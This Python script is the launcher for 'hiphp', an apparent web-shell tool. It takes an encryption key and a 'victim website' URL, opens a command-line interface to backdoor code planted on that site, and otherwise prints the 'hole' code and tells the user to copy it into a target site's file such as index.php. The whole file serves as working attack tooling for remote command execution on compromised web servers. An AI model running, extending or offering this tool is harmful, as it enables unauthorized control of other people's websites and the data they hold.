#!/usr/bin/env python
# coding:utf-8
#   |                                                          |
# --+----------------------------------------------------------+--
#   |   Code by : yasserbdj96                                  |
#   |   Email   : yasser.bdj96@gmail.com                       |
#   |   Github  : https://github.com/yasserbdj96               |
#   |   BTC     : bc1q2dks8w8uurca5xmfwv4jwl7upehyjjakr3xga9   |
# --+----------------------------------------------------------+--  
#   |        all posts #yasserbdj96 ,all views my own.         |
# --+----------------------------------------------------------+--
#   |                                                          |

#START{
import sys
import os

try:
    docker_check=False
    #
    try:
        DST=os.environ['DST'] if "DST" in os.environ else False
        if DST!=False:
            os.chdir("hiphp-desktop")
            os.system("python main.py docker")
            docker_check=True
    except:
        pass
    #
    KEY = os.environ['KEY'] if "KEY" in os.environ else sys.argv[1]
    URL = os.environ['URL'] if "URL" in os.environ else sys.argv[2]

    try:
        LANG = os.environ['LANGU'] if "LANGU" in os.environ else sys.argv[3]
    except:
        LANG = "php"

except:
    if docker_check==False:
        print(f"USAGE : python3 {sys.argv[0]} <KEY*> <URL*> <LANGU>")
        print("# *     = All inputs must be entered.")
        print("# KEY   = The password used for encrypt HIPHP_HOLE_CODE.")
        print("# URL   = Victim website link.")
        print("# LANG  = The language used on the victim's website, default LANG='php'.")
    exit()
    #pass

from hiphp import *
from hiphp.hiphpversion import __version__

# connect:
p1=hiphp(key=KEY,url=URL,lang=LANG)#Default: retu=False.
p2=hiphp(key=KEY,url=URL,lang=LANG,retu=True)

# Command line interface:
if emsg_1 not in p2.cli():
    p1.cli()
else:
    # Get the hole Code:
    p1.get_hole()# Copy this code into the file whose path you entered earlier. ex: https://localhost/index.php
#}END.
